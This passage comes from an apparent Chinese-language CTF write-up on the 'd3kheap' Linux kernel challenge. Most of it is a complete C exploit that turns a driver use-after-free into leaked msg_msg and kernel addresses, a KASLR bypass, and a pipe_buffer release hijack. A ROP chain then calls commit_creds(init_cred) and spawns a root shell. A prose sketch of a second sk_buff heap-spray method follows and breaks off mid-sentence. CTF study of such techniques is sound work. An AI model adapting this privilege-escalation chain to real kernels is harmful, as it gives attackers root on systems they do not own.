class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_MSG    ((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_SEG    ((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf *) msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="type">void</span> *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.next = (<span class="type">void</span> *) m_list_next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.prev = (<span class="type">void</span> *) m_list_prev;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_type = (<span class="type">long</span>) m_type;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_ts = m_ts;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;next = (<span class="type">void</span> *) next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;security = (<span class="type">void</span> *) security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[DATALEN_MSG + DATALEN_SEG];</span><br><span class="line">&#125; oob_msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">     * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">     * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">     * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">     * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">     * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">     * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">     * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">     * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">     * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">     * cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_KERNEL_OFFSET 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> kernel_addr[] = &#123;</span><br><span class="line">        <span class="number">0xffffffff812b76e9</span>,</span><br><span class="line">        <span class="number">0xffffffff82101980</span>,</span><br><span class="line">        <span class="number">0xffffffff82e77440</span>,</span><br><span class="line">        <span class="number">0xffffffff82411de7</span>,</span><br><span class="line">        <span class="number">0xffffffff817894f0</span>,</span><br><span class="line">        <span class="number">0xffffffff833fac90</span>,</span><br><span class="line">        <span class="number">0xffffffff823c3785</span>,</span><br><span class="line">        <span class="number">0xffffffff810b2990</span>,</span><br><span class="line">        <span class="number">0xffffffff82e49900</span>,</span><br><span class="line">        <span class="number">0xffffffff8111b8b4</span>,</span><br><span class="line">        <span class="number">0xffffffff8204ac40</span>,</span><br><span class="line">        <span class="number">0xffffffff8155c320</span>,</span><br><span class="line">        <span class="number">0xffffffff810d6ee0</span>,</span><br><span class="line">        <span class="number">0xffffffff810e55e0</span>,</span><br><span class="line">        <span class="number">0xffffffff82f05e80</span>,</span><br><span class="line">        <span class="number">0xffffffff82ec0260</span>,</span><br><span class="line">        <span class="number">0xffffffff8157a030</span>,</span><br><span class="line">        <span class="number">0xffffffff81578190</span>,</span><br><span class="line">        <span class="number">0xffffffff81531b30</span>,</span><br><span class="line">        <span class="number">0xffffffff81531b00</span>,</span><br><span class="line">        <span class="number">0xffffffff8153b150</span>,</span><br><span class="line">        <span class="number">0xffffffff8153b2e0</span>,</span><br><span class="line">        <span class="number">0xffffffff8149e380</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernel_offset_query</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_kernel_text_addr(kernel_text_leak)) &#123;</span><br><span class="line">        <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kernel_addr) / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!((kernel_text_leak ^ kernel_addr[i]) &amp; <span class="number">0xFFF</span>) &amp;&amp; !((kernel_text_leak - kernel_addr[i]) &amp; <span class="number">0xFFFFF</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> kernel_text_leak - kernel_addr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] unknown kernel addr: %p\n&quot;</span>, kernel_text_leak);</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">search_kernel_offset</span><span class="params">(<span class="type">void</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> *search_buf = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> kernel_offset = kernel_offset_query(search_buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel leak addr: %p\n&quot;</span>, search_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">            <span class="keyword">return</span> kernel_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> d3heap_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_add</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(d3heap_fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_delete</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(d3heap_fd, <span class="number">0xdead</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUE_NUM 5</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[HEAP_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125; msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> fake_msg[HEAP_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82c6d580</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810d25c0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810938f0</span>;</span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff812dbede</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    d3heap_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    chunk_add();</span><br><span class="line">    chunk_delete();</span><br><span class="line">    <span class="type">int</span> msqid[MSG_QUE_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] mdgget failed.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(msgbuf.mtext, <span class="string">&#x27;A&#x27;</span> + (i % <span class="number">26</span>), <span class="keyword">sizeof</span>(msgbuf.mtext));</span><br><span class="line">        msgbuf.mtype = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (write_msg(msqid[i], &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), i + <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] msgnd failed.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chunk_delete();</span><br><span class="line">    <span class="built_in">memset</span>(fake_msg, <span class="string">&#x27;#&#x27;</span>, <span class="keyword">sizeof</span>(fake_msg));</span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, DATALEN_MSG, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setxattr(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;sky123&quot;</span>, fake_msg, HEAP_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[<span class="number">0</span>], &amp;oob_msgbuf, DATALEN_MSG, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] msgrcv failed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msgbuf-&gt;mtype: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak msg_queue addr from msg_msg&quot;</span>, oob_msgbuf.mtext, DATALEN_MSG);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = INVALID_KERNEL_OFFSET;</span><br><span class="line">    <span class="type">size_t</span> msg_queue_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_msg_offset;</span><br><span class="line">    <span class="type">int</span> msg_queue_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="keyword">sizeof</span>(msgbuf.mtext); i + HEAP_SIZE &lt; DATALEN_MSG; i += HEAP_SIZE) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_msg</span> =</span> (<span class="keyword">struct</span> msg_msg *) &amp;oob_msgbuf.mtext[i];</span><br><span class="line">        <span class="keyword">if</span> (is_dir_mapping_addr((<span class="type">size_t</span>) msg_msg-&gt;m_list.next)</span><br><span class="line">            &amp;&amp; msg_msg-&gt;m_list.next == msg_msg-&gt;m_list.prev</span><br><span class="line">            &amp;&amp; msg_msg-&gt;m_ts == <span class="keyword">sizeof</span>(msgbuf.mtext)</span><br><span class="line">            &amp;&amp; msg_msg-&gt;m_type &gt;= <span class="number">2</span> &amp;&amp; msg_msg-&gt;m_type &lt;= MSG_QUE_NUM) &#123;</span><br><span class="line">            msg_queue_addr = (<span class="type">size_t</span>) msg_msg-&gt;m_list.next;</span><br><span class="line">            msg_msg_offset = i + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg);</span><br><span class="line">            msg_queue_index = (<span class="type">int</span>) msg_msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_offset = search_kernel_offset(&amp;oob_msgbuf.mtext[<span class="keyword">sizeof</span>(msgbuf.mtext)], DATALEN_MSG - <span class="keyword">sizeof</span>(msgbuf.mtext));</span><br><span class="line">    <span class="keyword">if</span> (msg_queue_addr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] msg_queue addr: %p\n&quot;</span>, msg_queue_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_queue index: %d\n&quot;</span>, msg_queue_index);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak heap.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, DATALEN_MSG + DATALEN_SEG, msg_queue_addr - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    setxattr(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;sky123&quot;</span>, fake_msg, HEAP_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[<span class="number">0</span>], &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] msgrcv failed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msgbuf-&gt;mtype: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak msg_msg addr from msg_queue&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        kernel_offset = search_kernel_offset(&amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> msg_msg_addr = *(<span class="type">size_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] msg_msg addr: %p\n&quot;</span>, msg_msg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> cur_search_addr = msg_queue_addr - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">while</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        <span class="type">size_t</span> msg_offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = DATALEN_MSG + DATALEN_SEG - <span class="number">8</span>; i &gt;= DATALEN_MSG; i -= <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!*(<span class="type">size_t</span> *) &amp;oob_msgbuf.mtext[i]) &#123;</span><br><span class="line">                msg_offset = i - DATALEN_MSG + <span class="number">8</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to find next msg.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        cur_search_addr += msg_offset;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] current searching addr: %p\n&quot;</span>, cur_search_addr);</span><br><span class="line">        build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, DATALEN_MSG + DATALEN_SEG, cur_search_addr, <span class="number">0</span>);</span><br><span class="line">        setxattr(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;sky123&quot;</span>, fake_msg, HEAP_SIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (peek_msg(msqid[<span class="number">0</span>], &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] msgrcv failed.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] msgbuf-&gt;mtype: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">        qword_dump(<span class="string">&quot;leak kernel addr form heap space&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line">        kernel_offset = search_kernel_offset(&amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    push_rsi_pop_rsp_pop_rbx_pop_r12_pop_r13_pop_rbp_ret += kernel_offset;</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, msg_msg_addr + <span class="number">0x5000</span>, msg_msg_addr + <span class="number">0x5000</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setxattr(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;sky123&quot;</span>, fake_msg, HEAP_SIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[msg_queue_index], &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] msgrcv failed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[<span class="number">0</span>], &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] msgrcv failed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe((<span class="type">int</span>[<span class="number">2</span>]) &#123;&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pipe_buffer_addr = msg_msg_addr - msg_msg_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] pipe_buffer addr: %p\n&quot;</span>, pipe_buffer_addr);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf</span> =</span> (<span class="type">void</span> *) &amp;fake_msg;</span><br><span class="line">    pipe_buf-&gt;ops = (<span class="type">void</span> *) (pipe_buffer_addr + <span class="number">0x100</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_msg[<span class="number">0x100</span>])-&gt;release = (<span class="type">void</span> *) push_rsi_pop_rsp_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;fake_msg[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = pop_rdi_ret;</span><br><span class="line">    rop[rop_idx++] = init_cred;</span><br><span class="line">    rop[rop_idx++] = commit_creds;</span><br><span class="line">    rop[rop_idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[rop_idx++] = user_cs;</span><br><span class="line">    rop[rop_idx++] = user_rflags;</span><br><span class="line">    rop[rop_idx++] = user_sp;</span><br><span class="line">    rop[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;sky123&quot;</span>, pipe_buf, HEAP_SIZE, <span class="number">0</span>);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="方法-2">方法 2</h5>
<p>与第一种方法不同，第二种方法相比修改 <code>msg_msg</code> 的结构体由
<code>setxattr</code> 换成了 <code>sk_buff</code> 。由于
<code>sk_buff</code>
不会被立即释放因此可以使用堆喷，在真实环境中成功率更高。</p>
<p>和第一种方法一样利用 <code>msg_msg</code> 劫持释放的 object
。不过这里由于采用 <code>msg_msg</code> 堆喷的方式劫持，因此不知道哪个
<code>msg_msg</code> 劫持了 object 。 一种解决方法是再次释放
object，然后使用 <code>sk_buff</code> 堆喷申请回来，同时修改
<code>msg_msg</code> 的 <code>m_ts</code> 为一个很大的值。当获取
<code>msg_msg</code> 中的数据时，在 <code>copy_msg</code>
函数中如果我们用于读取的 buffer 的大小小于 <code>m_ts</code>
会返回异常，根据这个可以判断出那个 <code>msg_msg</code> 劫持了 object
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<span class="comment">// 有个 size 检查</span></span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后参考第一种方法泄露 <code>msg_msg</code> 的地址，之后修复并释放
<code>msg_msg</code> 然后堆喷 <code>pipe_buffer</code> 劫持。 读取
